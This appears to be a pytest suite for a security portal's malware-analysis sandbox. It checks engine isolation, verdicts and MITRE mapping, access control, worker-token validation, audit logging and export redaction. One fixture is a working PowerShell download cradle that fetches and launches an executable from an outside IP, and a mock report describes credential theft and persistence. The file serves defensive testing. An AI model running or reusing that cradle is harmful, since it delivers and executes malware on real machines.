"""The seam between the portal and the vendored sandbox engine.

`app/sandbox/engine/` is a byte-identical copy of the standalone Cyclowareness
Sandbox's engine. That copy is only worth having if it stays identical, so the
first test here is about the seam itself: the engine must not have grown a
dependency on the portal beyond the four modules that exist to feed it.

The rest covers what the portal adds on top — the loop link, the analyst-only
boundary, and the off-host detonation contract, which is the one place another
machine can move a verdict.
"""
from __future__ import annotations

import io
import pathlib
import re
import time

import pytest

from app.sandbox.engine.models import JobStatus, SandboxJob
from app.sandbox.engine.storage import store_bytes
from app.sandbox.links import SandboxJobLink

ENGINE = pathlib.Path(__file__).resolve().parents[1] / "app" / "sandbox" / "engine"

#: The only modules the vendored engine may reach out of itself for. Widening
#: this list is how the copy starts to diverge from the standalone, so the list
#: is the test.
ALLOWED_SEAMS = {"db", "util", "config", "sovereignty"}


def test_the_engine_reaches_out_of_itself_only_through_the_declared_seam():
    """Every `from ..x` in the engine names a module the seam provides.

    The engine is vendored verbatim so the portal and the standalone cannot
    drift. A new import of, say, `..models` would compile fine here and fail on
    the standalone, which has no such module — and nobody would notice until the
    next time the copy was refreshed.
    """
    # `from ..x import y` at the top level of engine/*.py. Files under
    # engine/analyzers/ use `..` for the engine package itself, so only the
    # top-level modules are in scope.
    pattern = re.compile(r"^\s*from \.\.([a-z_]*) import", re.MULTILINE)
    violations = []
    for path in ENGINE.glob("*.py"):
        for module in pattern.findall(path.read_text(encoding="utf-8")):
            # `from .. import __version__` — the package itself, provided by
            # app/sandbox/__init__.py.
            if module == "":
                continue
            if module not in ALLOWED_SEAMS:
                violations.append(f"{path.name} imports ..{module}")
    assert not violations, (
        "the vendored engine grew a dependency the seam does not provide: "
        + "; ".join(violations)
    )


def test_the_engine_declares_no_table_the_portal_does_not_build():
    """The engine's tables land on the portal's own metadata.

    The seam re-exports the portal's `Base` rather than declaring a second one.
    If that ever changed, `create_all()` would build the portal's tables and
    quietly skip the sandbox's, and every sandbox route would 500 on a table
    that does not exist.
    """
    from app.database import Base

    assert "sandbox_jobs" in Base.metadata.tables
    assert "sandbox_job_links" in Base.metadata.tables


def test_analysis_produces_a_verdict_an_impact_and_mitre_techniques(db):
    """The richer outputs the standalone added, reaching the portal's rows."""
    from app.sandbox.engine import pipeline
    from app.sandbox import links

    stored = store_bytes(
        b"$c=New-Object Net.WebClient;"
        b"$c.DownloadFile('http://185.220.101.7/a.exe',\"$env:TEMP\\a.exe\");"
        b"Start-Process \"$env:TEMP\\a.exe\";powershell -enc SQBFAFgA"
    )
    job = pipeline.new_job(db, stored, original_name="cradle.ps1", tenant=links.TENANT)
    db.commit()
    pipeline.run(db, job)
    db.commit()

    assert job.status == JobStatus.COMPLETED
    assert job.verdict.get("verdict") == "malicious"
    # An impact rating, with the notation it was computed under — not a bare
    # number a reader has to guess the scale of.
    assert job.impact.get("rating") is not None
    # A download cradle is ingress tool transfer; the encoded command is
    # obfuscation. Both are techniques, not vibes.
    assert {t["technique_id"] for t in job.mitre} >= {"T1105", "T1027"}


def test_a_clean_verdict_rates_no_impact(db):
    """A clean sample has no demonstrated impact, and says so rather than 0.

    Rating a clean file would put a number on a harm nobody found. The engine
    returns an explicitly unrated result with the reason attached.
    """
    from app.sandbox.engine import pipeline
    from app.sandbox import links

    stored = store_bytes(b"Ordinary notes about Tuesday's meeting.\n" * 20)
    job = pipeline.new_job(db, stored, original_name="notes.txt", tenant=links.TENANT)
    db.commit()
    pipeline.run(db, job)
    db.commit()

    assert job.verdict.get("verdict") == "clean"
    # `rating` names the notation, not a score. What says "nothing was found" is
    # a zero base score at severity "none", with the reason in the rationale
    # rather than left for the reader to infer from a zero.
    assert job.impact["base_score"] == 0.0
    assert job.impact["severity"] == "none"
    assert job.impact["rationale"], "an unrated impact must carry its reason"


# --- the portal's own half ----------------------------------------------------
#: How long to let a submission settle before giving up on it. Analysis of these
#: tiny samples takes milliseconds; this is a deadlock guard, not a wait.
_SETTLE_TIMEOUT_S = 20.0


def submit_and_settle(client, headers, name: str, data: bytes) -> dict:
    """Upload a sample and return its report once analysis has finished.

    UPLOAD IS ASYNCHRONOUS AND THE TEST MUST NOT PRETEND OTHERWISE. `POST
    /upload` returns as soon as the bytes are quarantined and hands the analysis
    to a background thread, so the job it returns is `queued` with `final_score`
    still at its column default of 0.0.

    Reading that row straight away and calling it "before" is a race, and it is
    the race that turned CI red: on a slower Windows box the analysis had not
    finished by the time the detonation report was posted either, so both reads
    saw 0.0 and the assertion held. On Linux the analysis finished in between —
    `assert 17.3 == 0.0`. The test was wrong on both machines; only one of them
    said so.

    Waiting is also the more faithful test. A real worker is only ever offered
    COMPLETED jobs (see `_needs_dynamic`), so a detonation report for a job that
    is still being parsed is a state the contract does not produce.
    """
    r = client.post(
        "/api/sandbox/upload", headers=headers, files={"file": (name, io.BytesIO(data), None)}
    )
    assert r.status_code == 201, r.text
    public_id = r.json()["public_id"]

    deadline = time.monotonic() + _SETTLE_TIMEOUT_S
    while time.monotonic() < deadline:
        job = client.get(f"/api/sandbox/jobs/{public_id}", headers=headers).json()
        if job["status"] not in ("queued", "running"):
            return job
        time.sleep(0.05)
    raise AssertionError(
        f"analysis of {name} did not settle within {_SETTLE_TIMEOUT_S}s "
        f"(last status: {job['status']})"
    )


def test_upload_records_the_submitting_portal_user(client, analyst_headers, db):
    """The engine stores an identity string; the portal joins back to its user.

    The engine may not carry a `users.id` foreign key — the standalone has no
    users table — so the link is the portal's, on its own side of the seam.
    """
    r = client.post(
        "/api/sandbox/upload",
        headers=analyst_headers,
        files={"file": ("harmless.txt", io.BytesIO(b"nothing to see"), "text/plain")},
    )
    assert r.status_code == 201, r.text
    public_id = r.json()["public_id"]

    job = db.query(SandboxJob).filter_by(public_id=public_id).one()
    link = db.get(SandboxJobLink, job.id)
    assert link is not None and link.submitted_by_user_id is not None
    # Not raised by the loop, so no run is claimed.
    assert link.loop_run_id is None


def test_the_queue_reports_its_true_total_not_its_page_size(client, analyst_headers):
    r = client.get("/api/sandbox/jobs?limit=1", headers=analyst_headers)
    assert r.status_code == 200
    body = r.json()
    assert len(body["items"]) <= 1
    # The count is taken before the limit; a page of one out of many must not
    # report a total of one, or "showing 1 of 1" is a lie the UI repeats.
    assert body["total"] >= len(body["items"])


def test_an_impossible_status_filter_is_refused_not_answered_with_an_empty_page(
    client, analyst_headers
):
    """`?status=zzz` returning `200 []` reads exactly like a healthy queue."""
    r = client.get("/api/sandbox/jobs?status=zzz", headers=analyst_headers)
    assert r.status_code == 422
    assert "queued" in r.json()["detail"]


def test_the_queue_cannot_be_asked_to_serialise_the_whole_table(client, analyst_headers):
    """SQLite reads `LIMIT -1` as unbounded."""
    assert client.get("/api/sandbox/jobs?limit=-1", headers=analyst_headers).status_code == 422


def test_the_sandbox_is_closed_to_employees(client, employee_headers):
    """File analysis accepts hostile input by design. It is analyst-only."""
    for path in ("/api/sandbox/jobs", "/api/sandbox/jobs/stats"):
        assert client.get(path, headers=employee_headers).status_code == 403, path
    r = client.post(
        "/api/sandbox/url", headers=employee_headers, json={"url": "http://example.invalid"}
    )
    assert r.status_code == 403


def test_capabilities_states_what_is_missing_rather_than_implying_it_is_present(
    client, analyst_headers
):
    r = client.get("/api/sandbox/capabilities", headers=analyst_headers)
    assert r.status_code == 200
    body = r.json()
    assert len(body["static_analyzers"]) >= 10, body["static_analyzers"]
    # No worker is attached in tests, and the payload says why instead of
    # leaving a bare false the UI has to interpret.
    assert body["dynamic_worker"] is False
    assert body["dynamic_unavailable_reason"]


def test_capabilities_does_not_claim_static_only_once_ingest_is_open(
    client, analyst_headers, worker_headers
):
    """The two dynamic switches must not be able to contradict each other.

    Reading only the engine's `SANDBOX_DYNAMIC_WORKER` flag made this endpoint
    report "static analysis only" on a deployment whose ingest seam was open and
    had already accepted a detonation report — so the capability strip told an
    analyst the sample was never run while the report page showed its behaviour.
    """
    assert worker_headers  # the fixture is what opens the seam
    body = client.get("/api/sandbox/capabilities", headers=analyst_headers).json()
    assert body["dynamic_worker"] is True
    assert body["dynamic_unavailable_reason"] is None


# --- the detonation seam ------------------------------------------------------
def test_dynamic_ingest_is_closed_when_no_worker_token_is_configured(client):
    """Accepting externally supplied behaviour into a verdict is opt-in."""
    r = client.get("/api/dynamic/queue", headers={"X-Worker-Token": "anything"})
    assert r.status_code == 503
    assert "not enabled" in r.json()["detail"]


@pytest.fixture
def worker_headers(monkeypatch):
    """Enable the dynamic seam for one test, with a known token."""
    from app.config import get_settings

    settings = get_settings()
    monkeypatch.setattr(settings, "dynamic_worker_token", "test-worker-token", raising=False)
    return {"X-Worker-Token": "test-worker-token"}


def test_a_wrong_worker_token_is_rejected(client, worker_headers):
    r = client.get("/api/dynamic/queue", headers={"X-Worker-Token": "wrong"})
    assert r.status_code == 401


def test_a_detonation_report_moves_the_verdict_and_is_written_to_the_audit_trail(
    client, analyst_headers, worker_headers, db
):
    """The single largest automated change this product makes to a verdict.

    It must be recorded with what it changed FROM, not just what it changed to —
    an audit entry that says `71.8 -> 71.8` describes nothing.
    """
    from app.platform.models import AuditEvent

    # Settled first: "before" has to be the score the STATIC tier reached, not
    # whatever the row happened to hold mid-analysis. See submit_and_settle.
    before = submit_and_settle(
        client, analyst_headers, "payload.exe", b"MZ" + b"\x00" * 512
    )
    public_id = before["public_id"]
    assert before["status"] == "completed"

    r = client.post(
        f"/api/dynamic/report/{public_id}",
        headers=worker_headers,
        json={
            "engine": "capev2",
            "worker": "det-01",
            "ran": True,
            "duration_ms": 41000,
            "signals": [
                {
                    "id": "capev2.credential_store_access",
                    "title": "Read the browser credential store",
                    "severity": "critical",
                    "detail": "Opened Login Data and copied it to %TEMP%",
                },
                {
                    "id": "capev2.persistence_run_key",
                    "title": "Installed a Run key",
                    "severity": "high",
                    "detail": "HKCU\\...\\Run\\Updater",
                },
            ],
            "iocs": {"domains": ["c2.example.net"]},
            "timeline": [{"t_ms": 120, "kind": "process", "detail": "payload.exe"}],
        },
    )
    assert r.status_code == 200, r.text
    after = r.json()

    assert after["final_score"] > before["final_score"]
    assert after["dynamic"]["engine"] == "capev2"
    assert after["tiers"]["dynamic"]["ran"] is True

    entry = (
        db.query(AuditEvent)
        .filter(AuditEvent.action == "sandbox.dynamic_report_ingested")
        .order_by(AuditEvent.id.desc())
        .first()
    )
    assert entry is not None
    assert entry.before["final_score"] == pytest.approx(before["final_score"])
    assert entry.after["final_score"] == pytest.approx(after["final_score"])
    assert entry.actor_email.startswith("worker:")


def test_the_detonation_report_never_names_the_machine_that_ran_it(
    client, analyst_headers, worker_headers
):
    """Not in any document that leaves the building.

    The hostname of the machine that runs live malware for this organisation is
    a target. It is legitimately recorded on the job row and in the audit trail —
    "which machine reached this verdict" is a question an auditor asks — but the
    four exports go to an analyst, a threat-intel platform, a regulator and
    opposing counsel, and none of them needs it.

    Asserted against the exports themselves rather than against the one sentence
    that used to carry it, because there are four of them and each renders the
    dynamic tier its own way.
    """
    host = "det-01.internal.caspiandynamics.az"
    public_id = submit_and_settle(
        client, analyst_headers, "thing.exe", b"MZ" + b"\x00" * 300
    )["public_id"]
    r = client.post(
        f"/api/dynamic/report/{public_id}",
        headers=worker_headers,
        json={"engine": "capev2", "worker": host, "ran": True},
    )
    assert r.status_code == 200
    assert "det-01" not in r.json()["tiers"]["dynamic"]["detail"]

    for kind in ("json", "stix", "incident", "signed"):
        body = client.get(
            f"/api/sandbox/jobs/{public_id}/export.{kind}", headers=analyst_headers
        ).text
        assert "det-01" not in body, f"export.{kind} names the detonation host"

    # The PDF's text lives in Flate-compressed streams, so a raw scan of the
    # bytes proves nothing on its own — decompress and look inside.
    import re
    import zlib

    pdf = client.get(
        f"/api/sandbox/jobs/{public_id}/export.pdf", headers=analyst_headers
    ).content
    assert b"det-01" not in pdf
    for match in re.finditer(rb"stream\r?\n(.*?)\r?\nendstream", pdf, re.S):
        try:
            assert b"det-01" not in zlib.decompress(match.group(1))
        except zlib.error:
            continue


def test_a_non_finite_number_from_the_worker_cannot_poison_the_exports(
    client, analyst_headers, worker_headers
):
    """`json.loads` accepts NaN; Starlette refuses to serialise it.

    So one NaN in a free-form dict is easy to get in and impossible to get back
    out — accepted with a 200, after which every export of that job is a 500 for
    ever. It is neutralised at the seam.
    """
    public_id = submit_and_settle(
        client, analyst_headers, "thing2.exe", b"MZ" + b"\x00" * 300
    )["public_id"]
    r = client.post(
        f"/api/dynamic/report/{public_id}",
        headers={**worker_headers, "Content-Type": "application/json"},
        # The literal a stock `json.dumps` emits for float('inf'). Sent as raw
        # bytes because no JSON encoder here would produce it on purpose.
        content=b'{"engine":"native","ran":true,"facts":{"cpu":Infinity}}',
    )
    assert r.status_code == 200, r.text
    assert client.get(
        f"/api/sandbox/jobs/{public_id}/export.json", headers=analyst_headers
    ).status_code == 200
    assert client.get(
        f"/api/sandbox/jobs/{public_id}/export.signed", headers=analyst_headers
    ).status_code == 200


def test_an_unsigned_deployment_says_so_rather_than_implying_an_assurance(
    client, analyst_headers
):
    """No SIGNING_KEY: the evidence export is still produced in full."""
    public_id = submit_and_settle(client, analyst_headers, "doc.txt", b"plain text")["public_id"]
    r = client.get(f"/api/sandbox/jobs/{public_id}/export.signed", headers=analyst_headers)
    assert r.status_code == 200
    body = r.json()
    assert body["signed"] is False
    assert body["unsigned_reason"]
    # The report itself is still there — the point of the export.
    assert body.get("payload_digest", "").startswith("sha256:")
